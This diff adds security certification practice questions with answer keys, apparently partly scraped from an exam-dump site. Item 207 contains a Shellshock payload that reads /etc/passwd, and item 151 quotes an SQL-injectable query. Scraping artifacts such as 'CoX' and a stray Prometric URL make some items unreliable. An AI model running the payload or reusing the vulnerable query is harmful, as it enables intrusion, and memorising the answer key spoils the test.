+    "q": "Which of the following secure coding best practices ensures a character like < is translated into the &lt string when writing to an HTML page",
+    "choices": [
+      "Session management",
+      "Output encoding",
+      "Error handling",
+      "Input validation"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 144,
+    "q": "A salesperson's laptop has become unresponsive after attempting to open a PDF in their email. A cybersecurity analyst reviews the EDR and antivirus software for any alerts or unusual behavior but finds nothing suspicious. Which of the following threats would BEST classify the scenario",
+    "choices": [
+      "Ping of death",
+      "PII exfiltration",
+      "Zero-day malware",
+      "RAT"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 145,
+    "q": "Which of the following would a virtual private cloud infrastructure be classified as",
+    "choices": [
+      "Infrastructure as a Service",
+      "Platform as a Service",
+      "Software as a Service",
+      "Function as a Service"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 146,
+    "q": "Syed is developing a vulnerability scanner program for a large network of sensors to monitor his company's transcontinental oil pipeline. What type of network is this",
+    "choices": [
+      "BAS",
+      "CAN",
+      "SoC",
+      "SCADA"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 147,
+    "q": "You have been asked to recommend a capability to monitor all of the traffic entering and leaving the corporate network's default gateway. Additionally, the company's CIO requests to block certain content types before it leaves the network based on operational policies. Which of the following solutions should you recommend to meet these requirements",
+    "choices": [
+      "Install a firewall on the router's internal interface and a NIDS on the router's external interface",
+      "Configure IP filtering on the internal and external interfaces of the router",
+      "Installation of a NIPS solution on the internal and external interfaces of the router",
+      "Install a NIPS on the internal interface and a firewall on the external interface of the router"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 148,
+    "q": "A disgruntled employee executes a man-in-the-middle attack on the company network. Layer 2 traffic destined for the gateway is redirected to the employee's computer. What type of attack is this an example of",
+    "choices": [
+      "Evil twin",
+      "IP spoofing",
+      "ARP cache poisoning",
+      "Amplified DNS attack"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 149,
+    "q": "What must be evaluated to show security improvements over time",
+    "choices": [
+      "Testing tools",
+      "Reports",
+      "Metrics",
+      "Taxonomy of vulnerabilities"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 150,
+    "q": "Your company is adopting a cloud-first architecture model. Management wants to decommission the on-premises SIEM your analysts use and migrate it to the cloud. Which of the following is an issue when using this approach",
+    "choices": [
+      "The company will have less control over the SIEM",
+      "Legal and regulatory issues may prevent data migration to the cloud",
+      "The company will be dependent on the cloud provider's backup capabilities",
+      "A WAF escape exploit could allow an attacker to gain access to the SIEM"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 151,
+    "q": "While conducting a static analysis source code review of a program, you see the following line of code String query = \"SELECT * FROM CUSTOMER WHERE CUST_ID='\" + request.getParameter(\"id\") + \"\"';  What is the issue with the largest security issue with this line of code",
+    "choices": [
+      "This code is vulnerable to a buffer overflow attack",
+      "The * operator will allow retrieval of every data field about this customer in the CUSTOMER table",
+      "An SQL injection could occur because input validation is not being used on the id parameter",
+      "The code is using parameterized queries"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 152,
+    "q": "Which of the following policies should be created to provide employees with the guidelines and limitations they must follow when using company-provided email, computers, and network access",
+    "choices": [
+      "GDPR",
+      "DLP",
+      "PII",
+      "AUP"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 153,
+    "q": "Which of the following encryption types was used by WPA to better secure wireless networks than WEP",
+    "choices": [
+      "IV",
+      "AES",
+      "TKIP",
+      "CCMP"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 154,
+    "q": "Stephane was asked to assess the technical impact of a reconnaissance performed against his organization. He has discovered that a third party has been performing reconnaissance by querying the organization's WHOIS data. Which category of technical impact should he classify this as",
+    "choices": [
+      "Medium",
+      "Low",
+      "High",
+      "Critical"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 155,
+    "q": "What type of weakness is John the Ripper used to test during a technical assessment",
+    "choices": [
+      "Usernames",
+      "Passwords",
+      "Firewall rulesets",
+      "File permissions"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 156,
+    "q": "The management at Steven's work is concerned about rogue devices being attached to the network. Which of the following solutions would quickly provide the most accurate information that Steven could use to identify rogue devices on a wired network",
+    "choices": [
+      "Router and switch-based MAC address reporting",
+      "A discovery scan using a port scanner",
+      "A physical survey",
+      "Reviewing a central administration tool like a SCCM"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 157,
+    "q": "What is a common technique used by malicious individuals to perform a man-in-the-middle attack on a wireless network",
+    "choices": [
+      "Amplified DNS attack",
+      "Session hijacking",
+      "ARP cache poisoning",
+      "Creating an evil twin"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 158,
+    "q": "Which of the following actions should be done FIRST after forensically imaging a hard drive for evidence in an investigation",
+    "choices": [
+      "Encrypt the image file to ensure it maintains data integrity",
+      "Digitally sign the image file to provide non-repudiation of the collection",
+      "Encrypt the source drive to ensure an attacker cannot modify its contents",
+      "Create a hash digest of the source drive and the image file to ensure they match"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 159,
+    "q": "What command could be used to list the active services from the Windows command prompt",
+    "choices": [
+      "sc query type= running",
+      "sc config",
+      "sc query",
+      "sc query User= name"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 160,
+    "q": "A new wireless client is configured to join a 802.11 network. This client uses the same hardware and software as many of the other clients on the network. The client can see the network, but cannot connect. A wireless packet sniffer shows that the Wireless Access Point (WAP) is not responding to the association requests being sent by the wireless client.\nWhat is a possible source of this problem?",
+    "choices": [
+      "The WAP does not recognize the client’s MAC address",
+      "The client cannot see the SSID of the wireless network",
+      "Client is configured for the wrong channel",
+      "The wireless client is not configured to use DHCP"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 161,
+    "q": "You are tasked to perform a penetration test. While you are performing information gathering, you\nfind an employee list in Google. You find the receptionist’s email, and you send her an email changing the source email to her boss’s email (boss@company). In this email, you ask for a pdf with information. She reads your email and sends back a pdf with links. You exchange the pdf links with your malicious links (these links contain malware) and send back the modified pdf, saying that the links don’t work. She reads your email, opens the links, and her machine gets infected. You now have access to the company network.\nWhat testing method did you use?",
+    "choices": [
+      "Social engineering",
+      "Piggybacking",
+      "Tailgating",
+      "Eavesdropping"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 162,
+    "q": "If a tester is attempting to ping a target that exists but receives no response or a response that states the destination is unreachable, ICMP may be disabled and the network may be using TCP.\nWhich other option could the tester use to get a response from a host using TCP?",
+    "choices": [
+      "Traceroute",
+      "Hping",
+      "TCP ping",
+      "Broadcast ping"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 163,
+    "q": "Which is the first step followed by Vulnerability Scanners for scanning a network?",
+    "choices": [
+      "OS Detection",
+      "Firewall detection",
+      "TCP/UDP Port scanning",
+      "Checking if the remote host is alive"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 164,
+    "q": "Which of the following programs is usually targeted at Microsoft Office products?",
+    "choices": [
+      "Polymorphic virus",
+      "Multipart virus",
+      "Macro virus",
+      "Stealth virus"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 165,
+    "q": "A technician is resolving an issue where a computer is unable to connect to the Internet using a wireless access point. The computer is able to transfer files locally to other machines, but cannot successfully reach the Internet. When the technician examines the IP address and default gateway they are both on the 192.168.1.0/24.\nWhich of the following has occurred?",
+    "choices": [
+      "The computer is not using a private IP address.",
+      "The gateway is not routing to a public IP address.",
+      "The gateway and the computer are not on the same network.",
+      "The computer is using an invalid IP address."
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 166,
+    "q": "Identify the UDP port that Network Time Protocol (NTP) uses as its primary means of communication?",
+    "choices": [
+      "113",
+      "69",
+      "123",
+      "161"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 167,
+    "q": "Which of the following tools performs comprehensive tests against web servers, including dangerous files and CGIs?",
+    "choices": [
+      "Nikto",
+      "John the Ripper",
+      "Dsniff",
+      "Snort"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 168,
+    "q": "An incident investigator asks to receive a copy of the event logs from all firewalls, proxy servers, and Intrusion Detection Systems (IDS) on the network of an organization that has experienced a possible breach of security. When the investigator attempts to correlate the information in all of the logs, the sequence of many of the logged events do not match up.\nWhat is the most likely cause?",
+    "choices": [
+      "The network devices are not all synchronized.",
+      "Proper chain of custody was not observed while collecting the logs.",
+      "The attacker altered or erased events from the logs.",
+      "The security breach was a false positive."
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 169,
+    "q": "During a black-box pen test you attempt to pass IRC traffic over port 80/TCP from a compromised web enabled host. The traffic gets blocked; however, outbound HTTP traffic is unimpeded.\nWhat type of firewall is inspecting outbound traffic?",
+    "choices": [
+      "Circuit",
+      "Stateful",
+      "Application",
+      "Packet Filtering"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 170,
+    "q": "By using a smart card and pin, you are using a two-factor authentication that satisfies",
+    "choices": [
+      "Something you are and something you remember",
+      "Something you have and something you know",
+      "Something you know and something you are",
+      "Something you have and something you are"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 171,
+    "q": "“........is an attack type for a rogue Wi-Fi access point that appears to be a legitimate one offered on\nthe premises, but actually has been set up to eavesdrop on wireless communications. It is the wireless version of the phishing scam. An attacker fools wireless users into connecting a laptop or mobile phone to a tainted hot-spot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a fraudulent web site and luring people there.”\nFill in the blank with appropriate choice.",
+    "choices": [
+      "Evil Twin Attack",
+      "Sinkhole Attack",
+      "Collision Attack",
+      "Signal Jamming Attack"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 172,
+    "q": "What term describes the amount of risk that remains after the vulnerabilities are classified and the countermeasures have been deployed?",
+    "choices": [
+      "Residual risk",
+      "Impact risk",
+      "Deferred risk",
+      "Inherent risk"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 173,
+    "q": "Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets to the target computer, making it very difficult for an IDS to detect the attack signatures.\nWhich tool can be used to perform session splicing attacks?",
+    "choices": [
+      "tcpsplice",
+      "Burp",
+      "Hydra",
+      "Whisker"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 174,
+    "q": "You have successfully comprised a server having an IP address of 10.10.0.5. You would like to enumerate all machines in the same network quickly.\nWhat is the best Nmap command you will use?",
+    "choices": [
+      "nmap -T4 -q 10.10.0.0/24",
+      "nmap -T4 -F 10.10.0.0/24",
+      "nmap -T4 -r 10.10.1.0/24",
+      "nmap -T4 -O 10.10.0.0/24"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 175,
+    "q": "Which of the following is the BEST way to defend against network sniffing?",
+    "choices": [
+      "Using encryption protocols to secure network communications",
+      "Register all machines MAC Address in a Centralized Database",
+      "Use Static IP Address",
+      "Restrict Physical Access to Server Rooms hosting Critical Servers"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 176,
+    "q": "Although FTP traffic is not encrypted by default, which layer 3 protocol would allow for end-to-end encryption of the connection?",
+    "choices": [
+      "SFTP",
+      "Ipsec",
+      "SSL",
+      "FTPS"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 177,
+    "q": "You are the Network Admin, and you get a complaint that some of the websites are no longer accessible. You try to ping the servers and find them to be reachable. Then you type the IP address and then you try on the browser, and find it to be accessible. But they are not accessible when you try using the URL.\nWhat may be the problem?",
+    "choices": [
+      "Traffic is Blocked on UDP Port 53",
+      "Traffic is Blocked on TCP Port 80",
+      "Traffic is Blocked on TCP Port 54",
+      "Traffic is Blocked on UDP Port 80"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 178,
+    "q": "Which of the following tools is used to detect wireless LANs using the 802.11a/b/g/n WLAN standards on a linux platform?",
+    "choices": [
+      "Kismet",
+      "Abel",
+      "Netstumbler",
+      "Nessus"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 179,
+    "q": "Attacker creates a transparent 'iframe' in front of the URL which victim attempts to click, so victim thinks that he/she clicks to the 'Do you want to make $1000 in a day?' URL but actually he/she clicks to the content or URL that exists in the transparent 'iframe' which is setup by the attacker.\nWhat is the name of the attack which is mentioned in the scenario?",
+    "choices": [
+      "Session Fixation",
+      "HTML Injection",
+      "HTTP Parameter Pollution",
+      "Clickjacking Attack"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 180,
+    "q": "A network administrator discovers several unknown files in the root directory of his Linux FTP server. One of the files is a tarball, two are shell script files, and the third is a binary file is named \"nc.\" The FTP server's access logs show that the anonymous user account logged in to the server, uploaded the files, and extracted the contents of the tarball and ran the script using a function provided by the FTP server's software. The “ps” command shows that the “nc” file is running as process, and the netstat command shows the “nc” process is listening on a network port.\nWhat kind of vulnerability must be present to make this remote attack possible?",
+    "choices": [
+      "File system permissions",
+      "Privilege escalation",
+      "Directory traversal",
+      "Brute force login"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 181,
+    "q": "Which method of password cracking takes the most time and effort?",
+    "choices": [
+      "Dictionary attack",
+      "Shoulder surfing",
+      "Rainbow tables",
+      "Brute force"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 182,
+    "q": "What does the CoX flag do in an Nmap scan?",
+    "choices": [
+      "Perform an eXpress scan",
+      "Output the results in truncated format to the screen",
+      "Output the results in XML format to a file",
+      "Perform an Xmas scan"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 183,
+    "q": "A bank stores and processes sensitive privacy information related to home loans. However, auditing has never been enabled on the system.\nWhat is the first step that the bank should take before enabling the audit feature?",
+    "choices": [
+      "Perform a vulnerability scan of the system.",
+      "Determine the impact of enabling the audit feature.",
+      "Perform a cost/benefit analysis of the audit feature.",
+      "Allocate funds for staffing of audit log review."
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 184,
+    "q": "Which Intrusion Detection System is the best applicable for large environments where critical assets on the network need extra scrutiny and is ideal for observing sensitive network segments?",
+    "choices": [
+      "Honeypots",
+      "Firewalls",
+      "Network-based intrusion detection system (NIDS)",
+      "Host-based intrusion detection system (HIDS)"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 185,
+    "q": "The collection of potentially actionable, overt, and publicly available information is known as",
+    "choices": [
+      "Open-source intelligence",
+      "Real intelligence",
+      "Social intelligence",
+      "Human intelligence"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 186,
+    "q": "What is one of the advantages of using both symmetric and asymmetric cryptography in SSL/TLS?",
+    "choices": [
+      "Supporting both types of algorithms allows less-powerful devices such as mobile phones to use symmetric encryption instead.",
+      "Symmetric algorithms such as AES provide a failsafe when asymmetric methods fail.",
+      "Symmetric encryption allows the server to security transmit the session keys out-of-band.",
+      "Asymmetric cryptography is computationally expensive in comparison. However, it is well-suited to securely negotiate keys for use with symmetric cryptography."
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 187,
+    "q": "The change of a hard drive failure is once every three years. The cost to buy a new hard drive is $300. It will require 10 hours to restore the OS and software to the new hard disk. It will require a further 4 hours to restore the database from the last backup to the new hard disk. The recovery person earns $10/hour. Calculate the SLE, ARO, and ALE. Assume the EF = 1(100%).\nWhat is the closest approximate cost of this replacement and recovery operation per year?",
+    "choices": [
+      "$1320",
+      "$440",
+      "$100",
+      "$146"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 188,
+    "q": "What is the known plaintext attack used against DES which gives the result that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key?",
+    "choices": [
+      "Man-in-the-middle attack",
+      "Meet-in-the-middle attack",
+      "Replay attack",
+      "Traffic analysis attack"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 189,
+    "q": "Steve, a scientist who works in a governmental security agency, developed a technological solution to identify people based on walking patterns and implemented this approach to a physical control access.\nA camera captures people walking and identifies the individuals using Steve’s approach.\nAfter that, people must approximate their RFID badges. Both the identifications are required to open the door. In this case, we can say:",
+    "choices": [
+      "Although the approach has two phases, it actually implements just one authentication factor",
+      "The solution implements the two authentication factors: physical object and physical characteristic",
+      "The solution will have a high level of false positives",
+      "Biological motion cannot be used to identify people"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 190,
+    "q": "What is not a PCI compliance recommendation?",
+    "choices": [
+      "Use a firewall between the public network and the payment card data.",
+      "Use encryption to protect all transmission of card holder data over any public network.",
+      "Rotate employees handling credit card transactions on a yearly basis to different departments.",
+      "Limit access to card holder data to as few individuals as possible."
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 191,
+    "q": "What is the minimum number of network connections in a multihomed firewall?",
+    "choices": [
+      "3",
+      "5",
+      "4",
+      "2"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 192,
+    "q": "Suppose your company has just passed a security risk assessment exercise. The results display that the risk of the breach in the main company application is 50%. Security staff has taken some measures and implemented the necessary controls. After that, another security risk assessment was performed showing that risk has decreased to 10%. The risk threshold for the application is 20%.\nWhich of the following risk decisions will be the best for the project in terms of its successful continuation with the most business profit?",
+    "choices": [
+      "Accept the risk",
+      "Introduce more controls to bring risk to 0%",
+      "Mitigate the risk",
+      "Avoid the risk"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 193,
+    "q": "You need to deploy a new web-based software package for your organization. The package requires three separate servers and needs to be available on the Internet.\nWhat is the recommended architecture in terms of server placement?",
+    "choices": [
+      "All three servers need to be placed internally",
+      "A web server facing the Internet, an application server on the internal network, a database server on the internal network",
+      "A web server and the database server facing the Internet, an application server on the internal network",
+      "All three servers need to face the Internet so that they can communicate between themselves"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 194,
+    "q": "An attacker, using a rogue wireless AP, performed an MITM attack and injected an HTML code to embed a malicious applet in all HTTP connections.\nWhen users accessed any page, the applet ran and exploited many machines.\nWhich one of the following tools the hacker probably used to inject HTML code?",
+    "choices": [
+      "Wireshark",
+      "Ettercap",
+      "Aircrack-ng",
+      "Tcpdump"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 195,
+    "q": "Which mode of IPSec should you use to assure security and confidentiality of data within the same LAN?",
+    "choices": [
+      "ESP transport mode",
+      "ESP confidential",
+      "AH permiscuous",
+      "AH Tunnel mode"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 196,
+    "q": "Hackers often raise the trust level of a phishing message by modeling the email to look similar to the internal email used by the target company. This includes using logos, formatting, and names of the target company. The phishing message will often use the name of the company CEO, President, or Managers.\nThe time a hacker spends performing research to locate this information about a company is known as?",
+    "choices": [
+      "Exploration",
+      "Investigation",
+      "Reconnaissance",
+      "Enumeration"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 197,
+    "q": "Which of the following viruses tries to hide from anti-virus programs by actively altering and corrupting the chosen service call interruptions when they are being run?",
+    "choices": [
+      "Macro virus",
+      "Stealth/Tunneling virus",
+      "Cavity virus",
+      "Polymorphic virus"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 198,
+    "q": "The “Gray-box testing” methodology enforces what kind of restriction?",
+    "choices": [
+      "Only the external operation of a system is accessible to the tester.",
+      "The internal operation of a system in only partly accessible to the tester.",
+      "Only the internal operation of a system is known to the tester.",
+      "The internal operation of a system is completely known to the tester."
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 199,
+    "q": "When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator’s Computer to update the router configuration.\nWhat type of an alert is this?",
+    "choices": [
+      "False negative",
+      "True negative",
+      "True positive",
+      "False positive"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 200,
+    "q": "A large company intends to use Blackberry for corporate mobile phones and a security analyst is assigned to evaluate the possible threats. The analyst will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defenses and gain access to the Prometric Online Testing C Reports https://ibt1.prometric.com/users/custom/report.queue/rq.str... corporate network.\nWhat tool should the analyst use to perform a Blackjacking attack?",
+    "choices": [
+      "Paros Proxy",
+      "BBProxy",
+      "Blooover",
+      "BBCrack"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 201,
+    "q": "When you are getting information about a web server, it is very important to know the HTTP Methods (GET, POST, HEAD, PUT, DELETE, TRACE) that are available because there are two critical methods (PUT and DELETE). PUT can upload a file to the server and DELETE can delete a file from the server. You can detect all these methods (GET, POST, HEAD, DELETE, PUT, TRACE) using NMAP script engine.\nWhat Nmap script will help you with this task?",
+    "choices": [
+      "http-methods",
+      "http enum",
+      "http-headers",
+      "http-git"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 202,
+    "q": "Todd has been asked by the security officer to purchase a counter-based authentication system.\nWhich of the following best describes this type of system?",
+    "choices": [
+      "A biometric system that bases authentication decisions on behavioral attributes.",
+      "A biometric system that bases authentication decisions on physical attributes.",
+      "An authentication system that creates one-time passwords that are encrypted with secret keys.",
+      "An authentication system that uses passphrases that are converted into virtual passwords."
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 203,
+    "q": "Which of the following is a low-tech way of gaining unauthorized access to systems?",
+    "choices": [
+      "Social Engineering",
+      "Eavesdropping",
+      "Scanning",
+      "Sniffing"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 204,
+    "q": "Which system consists of a publicly available set of databases that contain domain name registration contact information?",
+    "choices": [
+      "WHOIS",
+      "CAPTCHA",
+      "IANA",
+      "IETF"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 205,
+    "q": "Why is a penetration test considered to be more thorough than vulnerability scan?",
+    "choices": [
+      "Vulnerability scans only do host discovery and port scanning by default.",
+      "A penetration test actively exploits vulnerabilities in the targeted infrastructure, while a vulnerability scan does not typically involve active exploitation.",
+      "It is not C a penetration test is often performed by an automated tool, while a vulnerability scan requires active engagement.",
+      "The tools used by penetration testers tend to have much more comprehensive vulnerability databases."
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 206,
+    "q": "Bob received this text message on his mobile phone: “Hello, this is Scott Smelby from the Yahoo Bank. Kindly contact me for a vital transaction on: .email protected.”.\nWhich statement below is true?",
+    "choices": [
+      "This is a scam as everybody can get a @yahoo address, not the Yahoo customer service employees.",
+      "This is a scam because Bob does not know Scott.",
+      "Bob should write to .email protected. to verify the identity of Scott.",
+      "This is probably a legitimate message as it comes from a respectable organization."
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 207,
+    "q": "env x=’(){ :;};echo exploit’ bash Cc ‘cat/etc/passwd’\nWhat is the Shellshock bash vulnerability attempting to do on a vulnerable Linux host?",
+    "choices": [
+      "Removes the passwd file",
+      "Changes all passwords in passwd",
+      "Add new user to the passwd file",
+      "Display passwd content to prompt"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 208,
+    "q": "Which of the following is assured by the use of a hash?",
+    "choices": [
+      "Authentication",
+      "Confidentiality",
+      "Availability",
+      "Integrity"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 209,
+    "q": "Which results will be returned with the following Google search query? site:target.com C site:Marketing.target.com accounting",
+    "choices": [
+      "Results from matches on the site marketing.target.com that are in the domain target.com but do not include the word accounting.",
+      "Results matching all words in the query.",
+      "Results for matches on target.com and Marketing.target.com that include the word “accounting”",
+      "Results matching “accounting” in domain target.com but not on the site Marketing.target.com"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 210,
+    "q": "Email is transmitted across the Internet using the Simple Mail Transport Protocol. SMTP does not encrypt email, leaving the information in the message vulnerable to being read by an unauthorized person. SMTP can upgrade a connection between two mail servers to use TLS. Email transmitted by SMTP over TLS is encrypted.\nWhat is the name of the command used by SMTP to transmit email over TLS?",
+    "choices": [
+      "OPPORTUNISTICTLS",
+      "UPGRADETLS",
+      "FORCETLS",
+      "STARTTLS"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 211,
+    "q": "In the field of cryptanalysis, what is meant by a “rubber-hose” attack?",
+    "choices": [
+      "Forcing the targeted keystream through a hardware-accelerated device such as an ASI",
+      "A backdoor placed into a cryptographic algorithm by its creator.",
+      "Extraction of cryptographic secrets through coercion or torture.",
+      "Attempting to decrypt ciphertext by making logical assumptions about the contents of the original plaintext."
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 212,
+    "q": "You are a Network Security Officer. You have two machines. The first machine (192.168.0.99) has snort installed, and the second machine (192.168.0.150) has kiwi syslog installed. You perform a syn scan in your network, and you notice that kiwi syslog is not receiving the alert message from snort. You decide to run wireshark in the snort machine to check if the messages are going to the kiwi syslog machine.\nWhat Wireshark filter will show the connections from the snort machine to kiwi syslog machine?",
+    "choices": [
+      "tcp.srcport= = 514 && ip.src= = 192.168.0.99",
+      "tcp.srcport= = 514 && ip.src= = 192.168.150",
+      "tcp.dstport= = 514 && ip.dst= = 192.168.0.99",
+      "tcp.dstport= = 514 && ip.dst= = 192.168.0.150"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 213,
+    "q": "What two conditions must a digital signature meet?",
+    "choices": [
+      "Has to be the same number of characters as a physical signature and must be unique.",
+      "Has to be unforgeable, and has to be authentic.",
+      "Must be unique and have special characters.",
+      "Has to be legible and neat."
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 214,
+    "q": "A company’s security policy states that all Web browsers must automatically delete their HTTP browser cookies upon terminating.\nWhat sort of security breach is this policy attempting to mitigate?",
+    "choices": [
+      "Attempts by attackers to access the user and password information stored in the company’s SQL database.",
+      "Attempts by attackers to access Web sites that trust the Web browser user by stealing the user’s authentication credentials.",
+      "Attempts by attackers to access password stored on the user’s computer without the user’s knowledge.",
+      "Attempts by attackers to determine the user’s Web browser usage patterns, including when sites were visited and for how long."
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 215,
